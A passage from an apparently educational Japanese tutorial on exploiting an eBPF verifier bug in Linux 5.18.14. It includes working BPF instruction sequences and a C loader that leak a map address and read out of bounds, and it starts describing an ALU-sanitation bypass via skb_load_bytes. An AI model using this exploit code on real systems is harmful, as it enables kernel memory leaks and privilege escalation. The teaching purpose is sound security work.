class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params">				   <span class="keyword">struct</span> bpf_insn *insn,</span></span><br><span class="line"><span class="params">				   <span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *ptr_reg,</span></span><br><span class="line"><span class="params">				   <span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *off_reg)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> known = tnum_is_const(off_reg-&gt;var_off);</span><br><span class="line">	s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,</span><br><span class="line">	    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;</span><br><span class="line">	u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,</span><br><span class="line">	    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||</span><br><span class="line">	    smin_val &gt; smax_val || umin_val &gt; umax_val) &#123;</span><br><span class="line">		<span class="comment">/* Taint dst register if offset had invalid bounds derived from</span></span><br><span class="line"><span class="comment">		 * e.g. dead branches.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		__mark_reg_unknown(env, dst_reg);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>上記のコードを読むと、今回のようにスカラー値側の追跡が壊れているケースでは、演算結果を<code>__mark_reg_unknown</code>で不明な値にしています。<br>
つまり、追跡を壊したレジスタとポインタを加算すると、結果はスカラー値として扱われます。スカラー値はBPFマップに書き込めるので、アドレスリークが可能です。さっそく<code>map_lookup_elem</code>で取得したBPFマップのポインタをリークしてみましょう。<br>
先ほど<code>s32_min_value</code>などの推測を壊しましたが、上記コードでは<code>smin_val</code>など64ビットレジスタが壊れている必要があります。32ビット値を64ビット値に拡張するには、x86-64と同じように、<code>BPF_MOV32_REG</code>を使って32ビットのレジスタにコピーすれば良いです。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R0 --&gt; scalar</span></span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// スカラー値となったポインタを保存</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), <span class="comment">// key</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP), <span class="comment">// value</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),          <span class="comment">// flag</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem), <span class="comment">// map_update_elem</span></span><br></pre></td></tr></table></figure>
<p>次のようにBPFマップのアドレスがリークできていれば成功です。R1には1が入っていたので、加算により実際よりもアドレスが1ずれていることに注意してください。</p>
<center>
  <img src="img/addrleak.png" alt="マップアドレスのリーク" style="width:640px;">
</center>
<p>このアドレスを見ると、正しく配列の先頭要素（リークしたデータ）が入っています。</p>
<center>
  <img src="img/gdb_map.png" alt="リークしたアドレスの周辺" style="width:600px;">
</center>
<p>0x110引いたところは、メタデータを含むBPFマップの先頭になります。今回は配列形式で作っているので、<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/include/linux/bpf.h#L1146"><code>bpf_array</code>構造体</a>が存在します。例えば先頭にある0xffffffff81c124a0という値は、<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/include/linux/bpf.h#L158"><code>bpf_map</code>構造体</a>の<code>ops</code>という関数テーブルになります。今回は使いませんが、eBPFの攻撃ではこの<code>ops</code>を書き換えて権限昇格する手法もあります。</p>
<p>この方法は<code>adjust_ptr_min_max_vals</code>のコードを知っていないと気づけませんが、実際にはこれを利用しなくてもexploitが書けます。（例題を参照）</p>
<p>マップのアドレスを持っていると以降のkASLRリークが簡単になるため、アドレスは持っておきましょう。マップのfdを渡すと（最後に1を引いた）アドレスを返してくれるように、関数化しておくとコードが綺麗になります。</p>
<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="オオカミくん" ></div>
  <p class="says">
    root権限では標準でポインタのリークが許可されているから、eBPFのexploitをデバッグするときは必ず一般ユーザー権限での動作確認も忘れないでね。
  </p>
</div>
<h2 id="範囲外参照">範囲外参照</h2>
<p><a href="verifier.html">前章</a>でも少し触れましたが、2022年現在はALU sanitationという緩和機構が入っているため、かつてのように単純には範囲外参照ができません。<br>
しかし、まずは「単純な」範囲外参照を試してみましょう。<br>
実は、ALU sanitationは<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/include/linux/bpf.h#L1469"><code>bpf_bypass_spec_v1</code></a>という関数がtrueを返したときは<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7196">スキップ</a>されます。この関数はroot権限ではtrueを返すので、root権限では今でも範囲外参照を試せます。<br>
そこで、まずはroot権限で「単純な」範囲外参照を試してみましょう。</p>
<h3 id="追跡が壊れた定数の作成">追跡が壊れた定数の作成</h3>
<p>検証器の誤りを悪用する上で便利なのは、「検証器がXと思っているが実際にはYである定数（XX!=Y）」を作ることです。とくにX=0,Y!=0のときは、何を掛けても検証器は0と判断するので、範囲外参照のオフセットを作るのに都合が良いです。<br>
まずは「検証器が0と思っているが実際には1である定数」を作ってみましょう。</p>
<p>今、R1は<code>u32_min_value</code>が1で<code>u32_max_value</code>が0になっています。反対に、R2に<code>u32_min_value</code>が0で<code>u32_max_value</code>が1である（壊れていない）値を入れます。ここでR1とR2の加算を考えると、範囲は<code>[1,0]+[0,1]=[1,1]</code>になることが分かります。</p>
<p>最小値、最大値が同じレジスタは、MOVなどのタイミングで定数扱いになります。R1の実際値は1でしたが、R2は0か1を取ります。したがって、加算結果は<code>[1,2]</code>でなければなりません。しかし、検証器は加算後のR1を定数1と判断してしまうため、実際には2が入っている状況が生まれます。<br>
あとはR1から1を引けば、目的の「検証器は0と思っているが実際には1である定数」が作れます。</p>
<p><code>u32_min_value</code>が0で<code>u32_max_value</code>が1であるR2は、論理・算術演算を組み合わせるか、条件分岐で1より大きいケースを捨てることで作成できます。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BPFマップを作成</span></span><br><span class="line"><span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line">val = <span class="number">1</span>;</span><br><span class="line">map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPFプログラム */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">  <span class="comment">// R0 --&gt; &amp;map[0]</span></span><br><span class="line">  BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">  BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">  BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">  BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">  BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">  BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">  BPF_EXIT_INSN(),</span><br><span class="line">  BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">  BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">  BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">  BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">  <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">  BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">  BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">  BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">  <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / 実際値:1</span></span><br><span class="line">  BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1) / 実際値:1</span></span><br><span class="line">  BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">  BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>), <span class="comment">// 1より大きいケースを破棄</span></span><br><span class="line">  BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">  BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// R1 --&gt; 0 / 実際値:1</span></span><br><span class="line">  BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">  BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">  BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// R1の実際の値を見てみる</span></span><br><span class="line">  BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, <span class="number">-0x10</span>),</span><br><span class="line">  BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">  BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), <span class="comment">// key</span></span><br><span class="line">  BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>),</span><br><span class="line">  BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP), <span class="comment">// value</span></span><br><span class="line">  BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>),</span><br><span class="line">  BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),          <span class="comment">// flag</span></span><br><span class="line">  BPF_EMIT_CALL(BPF_FUNC_map_update_elem), <span class="comment">// map_update_elem</span></span><br><span class="line"></span><br><span class="line">  BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">  BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>このプログラムを実行した後のマップ（R1の実際の値）を確認してみると、1になっていることが分かります。一方、22番目の命令終了時点で検証器はR1に0が入っていると推測しています。</p>
<center>
  <img src="img/broken_tracking.png" alt="追跡が壊れた定数の作成" style="width:640px;">
</center>
<h3 id="範囲外参照の確認">範囲外参照の確認</h3>
<p>先ほどのコードで、追跡結果が定数0になるにも関わらず、実際には1を持つようなレジスタが作れました。このレジスタに適当な数を掛けて、マップのポインタに足すと、結果として範囲外を指す有効なポインタが作れます。</p>
<p>実際に試してみましょう。<br>
次のBPFプログラムは、壊れたレジスタに0x100を掛けることで、「推測値=0 / 実際値=0x100」の状況を作り、それを使ってマップの範囲外を<code>BPF_LDX_MEM</code>で読んでいます。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// BPFマップを作成</span></span><br><span class="line">  <span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> addr_map = leak_map_address(mapfd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] addr_map = 0x%016lx\n&quot;</span>, addr_map);</span><br><span class="line"></span><br><span class="line">  val = <span class="number">1</span>;</span><br><span class="line">  map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line">  <span class="comment">/* BPFプログラム */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">// R0 --&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1) / actual:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0 / actual: 1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0 / actual: 0x100</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x100</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 範囲外参照でデータをR2にリーク</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_9),</span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_1),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// リークしたデータをユーザー空間で受け取る</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_2, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), <span class="comment">// key</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP), <span class="comment">// value</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),          <span class="comment">// flag</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem), <span class="comment">// map_update_elem</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケット用に設定 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> &#123;</span><br><span class="line">    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">    .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">    .insns = (<span class="type">uint64_t</span>)insns,</span><br><span class="line">    .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL v2&quot;</span>,</span><br><span class="line">    .log_level = <span class="number">2</span>,</span><br><span class="line">    .log_size = <span class="keyword">sizeof</span>(verifier_log),</span><br><span class="line">    .log_buf = (<span class="type">uint64_t</span>)verifier_log</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPFプログラムをロード */</span></span><br><span class="line">  <span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, verifier_log);</span><br><span class="line">  <span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケットを作成 */</span></span><br><span class="line">  <span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケットを利用（BPFプログラムの発動） */</span></span><br><span class="line">  write(socks[<span class="number">1</span>], <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">  map_lookup(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;val = 0x%016lx\n&quot;</span>, val);</span><br><span class="line"></span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>このプログラムを<strong>root権限で</strong>実行すると、次のように、設定した覚えのない値が読めていることが分かります。</p>
<center>
  <img src="img/simple_leak.png" alt="単純な範囲外参照" style="width:720px;">
</center>
<p>実際にgdbで確認すると、マップのアドレスから0x100先にリークしたデータが存在します。</p>
<center>
  <img src="img/gdb_simple_leak.png" alt="gdbで範囲外参照の値を確認" style="width:600px;">
</center>
<p>なお、0x100という定数をMOVで渡すと、検証器に範囲外参照を検知されることから、脆弱性に起因して範囲外参照を起こせていることが分かります。</p>
<p>しかし、一般ユーザー権限で同じプログラムを実行すると、ALU sanitationが加算による範囲外参照を0の加算に変換してしまうため、次のように何もデータがリークできません。（最初から入れていた値1が取り出されていることからも、ALU sanitationにより加算が意味を成していないことが分かります。）</p>
<center>
  <img src="img/user_leak_fail.png" alt="ユーザー権限では範囲外参照に失敗" style="width:640px;">
</center>
<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="オオカミくん" ></div>
  <p class="says">
    ALU sanitationがない時代は、この手法でbap_map構造体のopsなどを読み書きする攻撃が主流だったよ。
  </p>
</div>
<h2 id="ALU-sanitationの回避">ALU sanitationの回避</h2>
<p>幸いにも今回の対象であるカーネルv5.18.14では、ALU sanitationを回避する方法が存在します。考え方としては、ポインタへの（範囲外になる）加減算がパッチされてしまうので、既存のヘルパー関数にその処理をやってもらおうという発想になります。</p>
<p>一般ユーザーから使えるヘルパー関数は少ないですが、オフセットやサイズを引数に取る関数を調べてみましょう。すると、ソケットフィルタでは例えば<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/net/core/filter.c#L1720"><code>skb_load_bytes</code></a>という関数が使えます。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BPF_CALL_4(bpf_skb_load_bytes, <span class="type">const</span> <span class="keyword">struct</span> sk_buff *, skb, u32, offset,</span><br><span class="line">	   <span class="type">void</span> *, to, u32, len)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(offset &gt; INT_MAX))</span><br><span class="line">		<span class="keyword">goto</span> err_clear;</span><br><span class="line"></span><br><span class="line">	ptr = skb_header_pointer(skb, offset, len, to);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!ptr))</span><br><span class="line">		<span class="keyword">goto</span> err_clear;</span><br><span class="line">	<span class="keyword">if</span> (ptr != to)</span><br><span class="line">		<span class="built_in">memcpy</span>(to, ptr, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_clear:</span><br><span class="line">	<span class="built_in">memset</span>(to, <span class="number">0</span>, len);</span><br><span class="line">	<span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_skb_load_bytes_proto</span> =</span> &#123;</span><br><span class="line">	.func		= bpf_skb_load_bytes,</span><br><span class="line">	.gpl_only	= <span class="literal">false</span>,</span><br><span class="line">	.ret_type	= RET_INTEGER,</span><br><span class="line">	.arg1_type	= ARG_PTR_TO_CTX,</span><br><span class="line">	.arg2_type	= ARG_ANYTHING,</span><br><span class="line">	.arg3_type	= ARG_PTR_TO_UNINIT_MEM,</span><br><span class="line">	.arg4_type	= ARG_CONST_SIZE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>この関数は、パケットの内容をBPF側（マップやスタック）にコピーできます。<br>
第一引数をコンテキスト、第二引数をコピーしたいパケットデータのオフセット、第三引数をコピー先のバッファ、第四引数をコピーするサイズに指定します。コピー元はパケットデータなので、<code>write</code>でソケットに送ったデータがコピーされます。<br>
この関数を呼び出す際に引数が範囲外でないかを判断しますが、ALU sanitationの影響は受けません。したがって、関数内部で範囲外へのデータコピーが実現できます。</p>
<p>実際に試してみましょう。今、BPFマップのデータサイズは8なので、8バイト以上コピーできれば成功です。<br>
